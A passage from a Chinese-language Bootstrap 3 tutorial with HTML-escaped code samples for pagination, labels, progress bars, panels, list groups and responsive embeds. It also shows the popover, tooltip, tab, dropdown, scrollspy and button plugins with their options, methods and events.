\u0026lt;/ul\u0026gt;   禁用和激活状态  \u0026lt;ul class=\u0026quot;pagination\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;disabled\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;«\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;1\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;2\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;3\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;»\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   分页的尺寸 pagination-lg pagination-sm\n 翻页（Pager）\n  \u0026lt;ul class=\u0026quot;pager\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;previous\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;next\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   对齐的链接  \u0026lt;ul class=\u0026quot;pager\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;previous\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;← previous\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;next\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;next →\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   可选的禁用状态  \u0026lt;ul class=\u0026quot;pager\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;previous disabled\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;← previous\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;next\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;next →\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;  标签\n\u0026lt;span class=\u0026quot;label label-default\u0026quot;\u0026gt;Default\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;label label-primary\u0026quot;\u0026gt;Primary\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;label label-success\u0026quot;\u0026gt;Success\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;label label-info\u0026quot;\u0026gt;Info\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;label label-warning\u0026quot;\u0026gt;Warning\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026quot;label label-danger\u0026quot;\u0026gt;Danger\u0026lt;/span\u0026gt;   徽章badge  \u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Messages \u0026lt;span class=\u0026quot;badge\u0026quot;\u0026gt;20\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot;\u0026gt;Messages \u0026lt;span class=\u0026quot;badge\u0026quot;\u0026gt;20\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt;   巨幕 jumbotron  \u0026lt;div class=\u0026quot;jumbotron\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;container\u0026quot;\u0026gt; \u0026lt;h1\u0026gt;hello world!!!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;This is a simple hero unit, a simple jumbotron-style component for calling extra attention to featured content or information.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a class=\u0026quot;btn btn-primary\u0026quot; href=\u0026quot;\u0026quot;\u0026gt;Learn more\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   页头 page-header  \u0026lt;div class=\u0026quot;page-header\u0026quot;\u0026gt; \u0026lt;h1\u0026gt;Example page header \u0026lt;small\u0026gt;Subtext for header\u0026lt;/small\u0026gt; \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt;  缩略图\n 默认样式  \u0026lt;div class=\u0026quot;col-md-3 col-sm-6\u0026quot;\u0026gt; \u0026lt;a class=\u0026quot;thumbnail\u0026quot; href=\u0026quot;\u0026quot;\u0026gt; \u0026lt;img src=\u0026quot;images/kittens.jpg\u0026quot; alt=\u0026quot;\u0026quot;/\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt;   自定义内容  \u0026lt;div class=\u0026quot;col-md-3 col-sm-6\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;thumbnail\u0026quot;\u0026gt; \u0026lt;img src=\u0026quot;images/kittens.jpg\u0026quot; alt=\u0026quot;\u0026quot;/\u0026gt; \u0026lt;div class=\u0026quot;caption\u0026quot;\u0026gt; \u0026lt;!--text-center--\u0026gt; \u0026lt;h3\u0026gt;缩略图标签\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;一些示例文本。一些示例文本。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;a href=\u0026quot;#\u0026quot; class=\u0026quot;btn btn-primary\u0026quot; role=\u0026quot;button\u0026quot;\u0026gt;按钮\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026quot;#\u0026quot; class=\u0026quot;btn btn-default\u0026quot; role=\u0026quot;button\u0026quot;\u0026gt;按钮 \u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  警告框\n 基本默认样式  \u0026lt;div class=\u0026quot;alert alert-success\u0026quot;\u0026gt;成功！很好地完成了提交。\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;alert alert-info\u0026quot;\u0026gt;信息！请注意这个信息。\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;alert alert-warning\u0026quot;\u0026gt;警告！请不要提交。\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;alert alert-danger\u0026quot;\u0026gt;错误！请进行一些更改。\u0026lt;/div\u0026gt;   可关闭的警告框\u0026lt;button type=\u0026quot;button\u0026quot; class=\u0026quot;close\u0026quot; data-dismiss=\u0026quot;alert\u0026quot;\u0026gt;×\u0026lt;/button\u0026gt;\n 警告中的链接\n  \u0026lt;div class=\u0026quot;alert alert-success\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;#\u0026quot; class=\u0026quot;alert-link\u0026quot;\u0026gt;成功！很好地完成了提交。\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt;  九、进度条、媒体对象、列表组、面板、响应式插入组件 进度条\n 默认的进度条  \u0026lt;div class=\u0026quot;progress\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar\u0026quot; style=\u0026quot;width:45%;\u0026quot;\u0026gt;45%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   情景变化的进度条  \u0026lt;div class=\u0026quot;progress\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar progress-bar-info\u0026quot; style=\u0026quot;width:60%;\u0026quot;\u0026gt;60%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;progress\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar progress-bar-success\u0026quot; style=\u0026quot;width:25%;\u0026quot;\u0026gt;25%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;progress\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar progress-bar-danger\u0026quot; style=\u0026quot;width:45%;\u0026quot;\u0026gt;45%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;progress\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar progress-bar-warning\u0026quot; style=\u0026quot;width:45%;\u0026quot;\u0026gt;45%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   条纹的进度条 progress-striped  \u0026lt;div class=\u0026quot;progress progress-striped\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar\u0026quot; style=\u0026quot;width:45%;\u0026quot;\u0026gt;45%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   动画的进度条active  \u0026lt;div class=\u0026quot;progress progress-striped active\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar\u0026quot; style=\u0026quot;width:45%;\u0026quot;\u0026gt;45%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   堆叠的进度条  \u0026lt;div class=\u0026quot;progress\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;progress-bar progress-bar-warning\u0026quot; style=\u0026quot;width:45%;\u0026quot;\u0026gt;45%\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;progress-bar progress-bar-success\u0026quot; style=\u0026quot;width:25%;\u0026quot;\u0026gt;25%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  媒体对象\n\u0026lt;div class=\u0026quot;media\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;pull-left\u0026quot;\u0026gt;\u0026lt;img class=\u0026quot;media-object\u0026quot; src=\u0026quot;images/kittens.jpg\u0026quot; alt=\u0026quot;\u0026quot; width=\u0026quot;95\u0026quot;/\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;div class=\u0026quot;media-body\u0026quot;\u0026gt; \u0026lt;h4 class=\u0026quot;media-heading\u0026quot;\u0026gt;媒体标题\u0026lt;/h4\u0026gt; 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  列表组\n 向列表组添加国徽  \u0026lt;ul class=\u0026quot;list-group\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;免费域名注册 \u0026lt;span class=\u0026quot;badge pull-right\u0026quot;\u0026gt;20\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;免费 Window 空间托管\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;每年更新成本\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   向列表组添加链接  \u0026lt;div class=\u0026quot;list-group\u0026quot;\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;list-group-item active\u0026quot;\u0026gt;免费域名注册\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;list-group-item\u0026quot;\u0026gt;免费 Window 空间托管\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026quot;\u0026quot; class=\u0026quot;list-group-item\u0026quot;\u0026gt;每年更新成本\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt;   向列表组添加自定义内容  \u0026lt;ul class=\u0026quot;list-group\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;Cras justo odio\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;Dapibus ac facilisis in\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;Morbi leo risus\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;Porta ac consectetur ac\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;Vestibulum at eros\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;  面板\n 面板标题  \u0026lt;div class=\u0026quot;panel-heading\u0026quot;\u0026gt;标题\u0026lt;/div\u0026gt;   面板脚注  \u0026lt;div class=\u0026quot;panel-footer text-right\u0026quot;\u0026gt;by zichen\u0026lt;/div\u0026gt;   面板主题  \u0026lt;div class=\u0026quot;panel panel-primary\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;panel panel-success\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;panel panel-info\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;panel panel-warning\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;panel panel-danger\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt;   带表格的面板  \u0026lt;div class=\u0026quot;panel panel-default\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;panel-heading\u0026quot;\u0026gt;Panel heading\u0026lt;/div\u0026gt; \u0026lt;table class=\u0026quot;table\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;学号\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;姓名\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;年龄\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/div\u0026gt;   带列表组的面板  \u0026lt;div class=\u0026quot;panel panel-danger\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;panel-heading\u0026quot;\u0026gt;标题\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;panel-body\u0026quot;\u0026gt;面板内容显示区域\u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026quot;list-group\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;免费域名注册\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;免费 Window 空间托管\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;图像的数量\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;24*7 支持\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026quot;list-group-item\u0026quot;\u0026gt;每年更新成本\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;div class=\u0026quot;panel-footer text-right\u0026quot;\u0026gt;by zichen\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;  响应式嵌入组件\n 根据被嵌入内容的外部容器的宽度，自动创建一个固定的比例，从而让浏览器自动确定 内容的尺寸，能够在各种设备上缩放 这些规则可以直接用于\u0026lt;iframe\u0026gt;、\u0026lt;embed\u0026gt;、\u0026lt;video\u0026gt;和\u0026lt;object\u0026gt;元素。 16:9 响应式  \u0026lt;div class=\u0026quot;embed-responsive embed-responsive-16by9\u0026quot;\u0026gt; \u0026lt;embed width=\u0026quot;100%\u0026quot; height=\u0026quot;100%\u0026quot; src=\u0026quot;https://www.youtube.com/embed/zpOULjyy-n8?rel=0\u0026quot;\u0026gt;\u0026lt;/embed\u0026gt; \u0026lt;/div\u0026gt;   4:3 响应式  \u0026lt;div class=\u0026quot;embed-responsive embed-responsive-4by3\u0026quot;\u0026gt; \u0026lt;embed width=\u0026quot;100%\u0026quot; height=\u0026quot;100%\u0026quot; src=\u0026quot;https://www.youtube.com/embed/zpOULjyy-n8?rel=0\u0026quot;\u0026gt;\u0026lt;/embed\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;embed-responsive embed-responsive-16by9\u0026quot;\u0026gt; \u0026lt;iframe class=\u0026quot;embed-responsive-item\u0026quot; src=\u0026quot;https://www.youtube.com/embed/zpOULjyy-n8?rel=0\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;embed-responsive embed-responsive-4by3\u0026quot;\u0026gt; \u0026lt;iframe class=\u0026quot;embed-responsive-item\u0026quot; src=\u0026quot;https://www.youtube.com/embed/zpOULjyy-n8?rel=0\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt;  well\n 基本的well  \u0026lt;div class=\u0026quot;well\u0026quot;\u0026gt;您好，我在大的 Well 中！\u0026lt;/div\u0026gt;   尺寸大小 well-lg well-sm  \u0026lt;div class=\u0026quot;well well-lg\u0026quot;\u0026gt;您好，我在大的 Well 中！\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;well well-sm\u0026quot;\u0026gt;您好，我在小的 Well 中！\u0026lt;/div\u0026gt;  十、弹出框、警告框、标签页和工具提示插件插件 弹出框\n 弹出框点击一个元素，弹出一个包含标题和内容的容器  //基本用法 \u0026lt;button class=\u0026quot;btn btn-lg btn-danger\u0026quot; type=\u0026quot;button\u0026quot; data-toggle=\u0026quot;popover\u0026quot; title=\u0026quot;弹出框\u0026quot; data-content=\u0026quot;这是一个弹出框插件\u0026quot;\u0026gt; 点击弹出/隐藏弹出框 \u0026lt;/button\u0026gt;   JavaScript 初始化 $('button').popover();\n Popover 插件中的属性：\n data-animation 默认 true，在 popover 上应用一个 CSS fade 动画。 如果设置 false，则不应用。 data-html 默认 false，不允许提示内容格式为 html。如果设置 为 true，则可以设置 html 格式的提示内容 data-placement 默认值 top，还有 bottom、left、right 和 auto。 如果auto会自行调整合适的位置，如果是auto left 则会尽量在左边显示，但左边不行就靠右边。 data-selector 默认 false，可以选择绑定指定的选择器。 data-original-title 默认空字符串，弹出框的标题。优先级比 title 低 title 默认字空符串，弹出框的标题。 data-trigger 默认值 click，表示怎么触发 popover，其他值为： hover、focus、manual。多个值用空格隔开，manual 手动不能和其他同时设置。 data-delay 默认值 0，延迟触发 popover(毫秒)，如果传数字则， 表示 show/hide 的毫秒数，如果传对象，结构为： {show:500,hide:100} data-container 默认值 false，将 popover 附加到特定的元素上。比 如组合按钮组提示，容器不够，可以附加 body 上。container : 'body' data-template 更改提示框的 HTML 提示语的模版，默认值为：   \u0026lt;div class=\u0026quot;popover\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;arrow\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;h3 class=\u0026quot;popover-title\u0026quot;\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;div class=\u0026quot;popover-content\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   data-content 默认值为空，弹出框的内容。 data-viewport 设置外围容器的边际，具体代码看示例。  $('button').popover({ trigger:\u0026quot;click\u0026quot;, placement:\u0026quot;right\u0026quot;, viewport : { selector : '#view' } });   Popover 插件中的方法：\n 显示 $('button').popover('show'); 隐藏 $('button').popover('hide'); 反转显示和隐藏 $('button').popover('toggle'); 隐藏并销毁 $('button').popover('destroy');  Popover 插件中的事件：\n show.bs.popover 在调用 show 方法时触发 shown.bs.popover 在显示整个弹窗时时触发 hide.bs.popover 在调用 hide 方法时触发 hidden.bs.popover 在完全关闭整个弹出时触发   $('button').on('show.bs.tab', function () { alert('调用 show 方法时触发！'); });  警告框\n 警告框即为点击小时的信息框  //基本实例 \u0026lt;div class=\u0026quot;alert alert-warning\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;close\u0026quot; type=\u0026quot;button\u0026quot; data-dismiss=\u0026quot;alert\u0026quot;\u0026gt; \u0026lt;span\u0026gt;×\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;警告：您的浏览器不支持！\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt;   添加淡入淡出效果 \u0026lt;div class=\u0026quot;alert alert-warning fade in\u0026quot;\u0026gt;\n 如果用 JavaScript，可以代替 data-dismiss=\u0026quot;alert\u0026quot;\n Alert 插件中的方法：\n  $('.close').on('click', function () { $('#alert').alert('close'); })   Alert 插件中的事件：  close.bs.alert 当 close 方法被调用后立即触发 closed.bs.alert 当警告框被完全关闭后立即触发   $('#alert').on('close.bs.alert', function () { alert('当 close 方法被触发时调用！'); });  标签页\n 标签页也就是通常所说的选项卡功能  //基本用法 \u0026lt;ul class=\u0026quot;nav nav-tabs\u0026quot;\u0026gt; \u0026lt;li class=\u0026quot;active\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;#html5\u0026quot; data-toggle=\u0026quot;tab\u0026quot;\u0026gt;HTML5\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#bootstrap\u0026quot; data-toggle=\u0026quot;tab\u0026quot;\u0026gt;Bootstrap\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#jquery\u0026quot; data-toggle=\u0026quot;tab\u0026quot;\u0026gt;jQuery\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#extjs\u0026quot; data-toggle=\u0026quot;tab\u0026quot;\u0026gt;ExtJS\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;div class=\u0026quot;tab-content\u0026quot; style=\u0026quot;padding: 10px;\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;tab-pane active\u0026quot; id=\u0026quot;html5\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;tab-pane\u0026quot; id=\u0026quot;bootstrap\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;tab-pane\u0026quot; id=\u0026quot;jquery\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;tab-pane\u0026quot; id=\u0026quot;extjs\u0026quot;\u0026gt;...\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   可以设置淡入淡出效果 fade，而 in 表示首选的内容默认显示  \u0026lt;div class=\u0026quot;tab-pane fade in active\u0026quot; id=\u0026quot;html5\u0026quot;\u0026gt;   也可以换成胶囊式  \u0026lt;ul class=\u0026quot;nav nav-pills\u0026quot;\u0026gt;   data-target 使用 data-target 绑定或不绑定效果都是一样的\n Tab 插件中的方法：\n  $('#nav a').on('click', function (e) { e.preventDefault(); $(this).tab('show'); });   Tab 插件中的事件：  show.bs.tab 在调用 tab 方法时触发 shown.bs.tab 在显示整个标签时触发   $('#nav a').on('show.bs.tab', function () { alert('调用 tab 时触发！'); });  工具提示\n 工具提示就是通过鼠标移动选定在特定的元素上时，显示相关的提示语  //基本实例 \u0026lt;a href=\u0026quot;#\u0026quot; data-toggle=\u0026quot;tooltip\u0026quot; title=\u0026quot;超文本标识符\u0026quot;\u0026gt;HTML5\u0026lt;/a\u0026gt;   JavaScript 初始化 $('#section').tooltip();\n data-animation 默认 true，在 tooltip 上应用一个 CSS fade 动画。 如果设置 false，则不应用。\n data-html 默认 false，不允许提示内容格式为 html。如果设置 为 true，则可以设置 html 格式的提示内容。\n data-placement 默认值 top，还有 bottom、left、right 和 auto。 如果auto会自行调整合适的位置，如果是auto left 则会尽量在左边显示，但左边不行就靠右边。\n data-selector 默认 false，可以选择绑定指定的选择器。 rel=\u0026quot;tooltip\u0026quot;\n data-original-title 默认空字符串，提示语的内容。优先级比 title 低\n title 默认字空符串，提示语的内容。\n data-trigger 默认值 hover foucs，表示怎么触发 tooltip，其 他值为：click、manual。多个值用空格隔开，manual 手动不能和其他同时设置。\n data-delay 默认值 0，延迟触发 tooltip(毫秒)，如果传数字则， 表示 show/hide 的毫秒数，如果传对象，结构为：{ show:500,hide:100 }\n data-container 默认值 false，将tooltip 附加到特定的元素上。比 如组合按钮组提示，容器不够，可以附加 body 上。container : 'body'\n data-template 更改提示框的 HTML 提示语的模版，默认值为：\n  \u0026lt;div class='tooltip'\u0026gt; \u0026lt;div class='tooltip-arrow'\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class='tooltip-inner'\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;a href=\u0026quot;#\u0026quot; rel=\u0026quot;tooltip\u0026quot; data-toggle=\u0026quot;tooltip\u0026quot; title=\u0026quot;超文本标识符\u0026quot; data-animation=\u0026quot;false\u0026quot; data-html=\u0026quot;true\u0026quot; data-placement=\u0026quot;auto\u0026quot; data-selector=\u0026quot;a[rel=tooltip]\u0026quot; data-trigger=\u0026quot;click\u0026quot; data-delay=\u0026quot;500\u0026quot; data-template=\u0026quot;\u0026lt;b\u0026gt;123\u0026lt;/b\u0026gt;\u0026quot; \u0026gt;HTML5 \u0026lt;/a\u0026gt;  $('#selector a').tooltip({ delay : { show : 500, hide : 100, }, });   Tooltip插件中的方法：\n 显示 $('#section a').tooltip('show'); 隐藏 $('#section a').tooltip('hide'); 反转显示和隐藏 $('#section a').tooltip('toggle'); 隐藏并销毁 $('#section a').tooltip('destroy');  Tooltip插件中的事件：\n show.bs.tooltip 在 show 方法调用时立即触发 shown.bs.tooltip 在提示框完全显示给用户之后触发 hide.bs.tooltip 在 hide 方法调用时立即触发 hidden.bs.tooltip 在提示框完全隐藏之后触发   $('#select a').on('show.bs.tooltip', function () { alert('调用 show 时触发！'); }); //data-selector $(\u0026quot;#selector\u0026quot;).tooltip({ selector:\u0026quot;a[rel='tooltip']\u0026quot; });   data-container  \u0026lt;div class=\u0026quot;btn-group\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot; title=\u0026quot;超文本标记符\u0026quot;\u0026gt;left\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot; title=\u0026quot;超文本标记符\u0026quot;\u0026gt;middle\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026quot;btn btn-default\u0026quot; title=\u0026quot;超文本标记符\u0026quot;\u0026gt;right\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt;  $(\u0026quot;button\u0026quot;).tooltip({ delay:{ show:500, hide:100 }, container:\u0026quot;body\u0026quot; });  十一、下拉菜单、滚动监听、按钮和折叠插件 下拉菜单插件\n\u0026lt;div class=\u0026quot;dropdown\u0026quot;\u0026gt; \u0026lt;button class=\u0026quot;btn btn-primary\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot;\u0026gt; 下拉菜单 \u0026lt;span class=\u0026quot;caret\u0026quot;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;ul class=\u0026quot;dropdown-menu\u0026quot;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#\u0026quot;\u0026gt;首页\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#\u0026quot;\u0026gt;产品\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#\u0026quot;\u0026gt;资讯\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;#\u0026quot;\u0026gt;关于\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt;   如果按钮在容器外部，可以通过 data-target 进行绑定  \u0026lt;button class=\u0026quot;btn btn-primary\u0026quot; id=\u0026quot;btn\u0026quot; data-toggle=\u0026quot;dropdown\u0026quot; data-target=\u0026quot;#dropdown\u0026quot;\u0026gt;   Dropdown插件的方法：，但仍然需要 data-*\n $('#btn').dropdown(); $('#btn').dropdown('toggle');  Dropdown插件的事件：\n show.bs.dropdown 在 show 方法调用时立即触发。 shown.bs.dropdown 在下拉菜单完全显示出来，并且等 CSS 动画完成之后 触发。 hide.bs.dropdown 在 hide 方法调用时，但还未关闭隐藏时触发。 hidden.bs.dropdown 在下拉菜单完全隐藏之后，并且等 CSS 动画完成之后 触发。   $('#dropdown').on('show.bs.dropdown', function () { alert('在调用 show 方法时立即触发！'); });  滚动监听插件\n data-offset 默认值为 10，固定弄内容距滚动容器 10 像素以内， 就高亮显示所对应的菜单 data-spy 设置 scroll，将设置滚动容器监听 data-target 设置#nav，绑定指定监听的菜单\n scroll插件的方法：\n  $(\u0026quot;#scroll\u0026quot;).scrollspy({ //offset: 0, target: \u0026quot;#nav\u0026quot; });   activate.bs.scrollspy 每当一个新条目被激活后都将由滚动监听插件触 发此事件。 事件绑定在导航上  $('#nav').on('activate.bs.scrollspy', function () { alert('新条目被激活后触发此事件！'); });   滚动监听还有一个更新容器 DOM 的方法  refresh 更新容器 DOM 的方法    function removeSec(e) { $(e).parents('.sec').remove(); $('#content').scrollspy('refresh'); }  按钮插件\n 单个切换  \u0026lt;button class=\u0026quot;btn btn-primary\u0026quot; data-toggle=\u0026quot;button\u0026quot; autocomplete=\u0026quot;off\u0026quot;\u0026gt;单个切换\u0026lt;/button\u0026gt;   注：在 Firefox 多次页面加载时，按钮可能保持表单的禁用或选择状态。解决方案是： 添加autocomplete=\u0026quot;off\u0026quot;。\n 单选按钮\n  \u0026lt;div class=\u0026quot;btn-group\u0026quot; data-toggle=\u0026quot;buttons\u0026quot;\u0026gt; \u0026lt;label for=\u0026quot;\u0026quot; class=\u0026quot;btn btn-primary active\u0026quot;\u0026gt; 